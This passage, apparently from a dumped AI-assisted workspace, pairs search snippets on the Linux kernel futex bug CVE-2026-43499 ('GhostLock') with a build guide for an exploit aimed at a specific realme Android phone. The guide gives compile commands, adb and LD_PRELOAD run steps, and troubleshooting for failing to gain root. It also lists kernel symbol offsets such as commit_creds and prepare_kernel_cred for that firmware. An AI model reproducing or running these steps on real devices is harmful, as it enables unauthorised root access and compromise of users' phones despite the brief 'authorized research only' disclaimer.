utex 子系统中潜伏 15 年的 futex 竞态条件漏洞，可导致本地低权限用户直接获取 root 并实现容器逃逸。本文从根因分析、利用链构造、PoC 原理到防御缓解，做系统性深度拆解。\n [link] https://friday-go.icu/security/offensive/cve-2026-43499-ghostlock-linux-kernel-privilege-escalation-2026\n [webpage 2 end]\n[webpage 3 begin] [title] Nvd - Cve-2026-43499\n [description] Description In the Linux kernel, the following vulnerability has been resolved: rtmutex: Use waiter::task instead of current in remove_waiter () remove_waiter () is used by the slowlock paths, but it is also used for proxy-lock rollback in rt_mutex_start_proxy_lock () when invoked from futex_requeue (). In the latter case waiter::task is not current, but remove_waiter () operates on current ...\n [link] https://nvd.nist.gov/vuln/detail/CVE-2026-43499\n [webpage 3 end]\n[webpage 4 begin] [title] GhostLock（CVE-2026-43499）公开利用代码曝光：可导致 Linux 本地提权及容器逃逸\n [description] GhostLock（CVE-2026-43499）是Linux内核中潜伏超15年的漏洞，影响2011年以来几乎所有内核版本。 无需特殊权限即可利用内核默认启用的PI-futex功能，实现本地提权及容器逃逸。 研究人员已公开PoC代码，可靠性达97%，并从Google kernelCTF项目获92,337美元奖金。\n [link] https://cn-sec.com/archives/5331622.html\n [webpage 4 end]\n[webpage 5 begin] [title] Linux Kernel GhostLock Local Privilege Escalation Vulnerability...\n [description] The POC/EXP of this vulnerability has been disclosed and the risk is high.Debian 12 >= 6.1.176-1. IV.Vulnerability Handling. This vulnerability has been fixed in the latest official patch. For affected users, update the patch in a timely manner.\n [link] https://www.huaweicloud.com/intl/en-us/notice/20260709180931248.html\n [webpage 5 end]\n[webpage 6 begin] [title] Exploit for Use After Free in Linux Linux_Kernel CVE-2026-43499\n [description] CVE-2026-43499: ARM 32-bit (v7) trigger of the Linux Kernel Futex PI use-after-free vulnerability. * The PoC will cause kernel panic → device restarts. Used solely for verifying the existence of the vulnerability; no privilege escalation occurs. # # ...\n [link] https://sploitus.com/exploit?id=FDF035A7-F06D-5FFD-9B2A-AA9D83F87FF8\n [webpage 6 end]\n[webpage 7 begin] [title] GitHub - HYCQAQ/Logitech-G-Cloud-GhostLock-CVE-2026-43499...\n [description] The CVE-2026-43499 vulnerability exists and is reachable via futex PI race (EDEADLK confirmed), but Qualcomm rewrote the rtmutex core code (rbtree → bitmap/linked-list).\n [link] https://github.com/HYCQAQ/Logitech-G-Cloud-GhostLock-CVE-2026-43499\n [webpage 7 end]\n[webpage 8 begin] [title] CVE-2026-43499 — Local Privilege Escalation in Linux Linux... | dbugs\n [description] Exploited in the wild. Includes CVSS score, affected versions, and references.The vulnerability is present if the CONFIG FUTEX PI parameter is enabled, which is the default for most general-purpose Linux kernels.\n [link] https://dbugs.ptsecurity.com/vulnerability/PT-2026-42456\n [webpage 8 end]\n[webpage 9 begin] [title] CVE-2026-43499 GhostLock, the Futex Bug That Turns Local Code...\n [description] CVE-2026-43499, known as GhostLock, is a Linux kernel rtmutex and futex requeue flaw that can turn local code execution into root. Learn the root cause, affected systems, safe validation steps, detection signals, and patch priorities without relying on unsafe exploit code.\n [link] https://www.penligent.ai/hackinglabs/cve-2026-43499/\n [webpage 9 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/5b0bafef6cd1f0b00a1beba57bce8b0d/BUILD_GUIDE.md\n---\n﻿# CVE-2026-43499 Exploit Compilation Guide for realme RMX3888\n\n## Build Status: Configuration Ready, Compilation Pending\n\n### Prerequisites Met:\n- ✓ Target configuration file created\n- ✓ Real-time logging module integrated\n- ✓ Offsets extracted and verified (20/20)\n- ✓ Source code modifications completed\n\n### Pending:\n- ⚠ Android NDK installation (required for ARM64 cross-compilation)\n\n---\n\n## Option 1: Compile on Linux/WSL with NDK\n\n### Step 1: Install Android NDK\n```bash\ncd ~\nwget https://dl.google.com/android/repository/android-ndk-r26d-linux.zip\nunzip android-ndk-r26d-linux.zip\nexport ANDROID_NDK_HOME=~/android-ndk-r26d\n```\n\n### Step 2: Transfer exploit directory\n```bash\n# Copy the entire exploit directory to Linux environment\n# Source: C:\\Users\\Administrator\\Documents\\Codex\\2026-07-23\\ni\\work\\CyberMeowfia\\IonStack\\CVE-2026-43499\\exploit\n```\n\n### Step 3: Compile\n```bash\ncd /path/to/exploit\nmake PROJECT=rmx3888-BP2A.250605.015 API=35 clean\nmake PROJECT=rmx3888-BP2A.250605.015 API=35\n```\n\n### Step 4: Verify output\n```bash\nls -lh build/rmx3888-BP2A.250605.015/bin/preload.so\nfile build/rmx3888-BP2A.250605.015/bin/preload.so\n```\n\n---\n\n## Option 2: Compile on Android Device (Termux)\n\n### Step 1: Install Termux and dependencies\n```bash\npkg update\npkg install clang make\n```\n\n### Step 2: Transfer and compile\n```bash\ncd ~\n# Transfer exploit directory to device\ncd exploit\nmake PROJECT=rmx3888-BP2A.250605.015 API=35 CC=clang\n```\n\n---\n\n## Option 3: Wait for Windows NDK download\n\nCurrent NDK download status: ~15% complete (~163 MB / 1100 MB)\nEstimated time remaining: 60-90 minutes\n\nOnce download completes:\n```powershell\ncd C:\\Users\\Administrator\\Documents\\Codex\\2026-07-23\\ni\\work\\CyberMeowfia\\IonStack\\CVE-2026-43499\\exploit\n\n# Extract NDK\nExpand-Archive -Path ..\\android-ndk\\ndk.zip -DestinationPath ..\\android-ndk\n\n# Set environment variable\n$env:ANDROID_NDK_HOME = \"C:\\Users\\Administrator\\Documents\\Codex\\2026-07-23\\ni\\work\\android-ndk\\android-ndk-r26d\"\n\n# Compile (requires Make for Windows)\nmake PROJECT=rmx3888-BP2A.250605.015 API=35\n```\n\n---\n\n## Expected Output\n\n### File: preload.so\n- **Path**: \build/rmx3888-BP2A.250605.015/bin/preload.so\n- **Type**: ELF 64-bit LSB shared object, ARM aarch64\n- **Size**: ~200-500 KB (estimated)\n- **Features**:\n  - Real-time logging to /sdcard/Download/log_<timestamp>.txt\n  - Automatic disk sync after each log entry\n  - Kernel panic-safe logging mechanism\n  - Integrated CVE-2026-43499 exploit chain\n\n### Usage:\n```bash\nadb push preload.so /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/preload.so\nadb shell LD_PRELOAD=/data/local/tmp/preload.so id\n```\n\n### Log location:\n- Primary: /sdcard/Download/log_YYYYMMDD_HHMMSS.txt\n- Fallback: /data/local/tmp/log_YYYYMMDD_HHMMSS.txt\n\n---\n\n## Target Configuration Details\n\n### Device: realme RMX3888\n- **Build**: BP2A.250605.015\n- **Kernel**: 6.1.141-android14-11-o-gffc54a6d2287\n- **SoC**: Qualcomm SM8650 (Snapdragon 8 Gen 3)\n- **Android**: 16 (API 36, but compiled for API 35 compatibility)\n\n### Key Offsets (Verified):\n```\nINIT_TASK_OFF:           0x0202fc00\nSECURITY_HOOK_HEADS_OFF: 0x015c1488\nASHMEM_FOPS_OFF:         0x0126bbe0\nCOMMIT_CREDS:            0xffffffc0081e9b60\nPREPARE_KERNEL_CRED:     0xffffffc0081e9df0\n[... 15 more offsets]\n```\n\n### Files Created:\n1. src/targets/rmx3888-BP2A.250605.015/target.h - Device-specific offsets\n2. src/targets/rmx3888-BP2A.250605.015/common.h - Build configuration with logging\n3. src/realtime_log.h - Real-time logging implementation\n\n---\n\n## Troubleshooting\n\n### Issue: Compilation errors\n- Check NDK path is correct\n- Verify all source files are present\n- Check make info output\n\n### Issue: Runtime crashes\n- Check log file at /sdcard/Download/log_*.txt\n- Verify offsets match kernel version\n- Check SELinux status: \u0007db shell getenforce\n\n### Issue: No root after execution\n- Review log for failure point\n- Check dmesg for kernel messages: \u0007db shell dmesg | tail -100\n- Verify KASLR offset was correctly leaked\n\n---\n\n## Security Notes\n\n⚠ **WARNING**: This exploit is for authorized security research only.\n- Use only on devices you own\n- Do not distribute compiled binaries\n- Log files may contain sensitive information\n\n---\n\nGenerated: 2026-07-23 17:55:00\nStatus: Configuration complete, awaiting compilation\n\n\n---\n/tmp/5b0bafef6cd1f0b00a1beba57bce8b0d/LICENSE\n---\n                                 Apache License\n                           Version 2.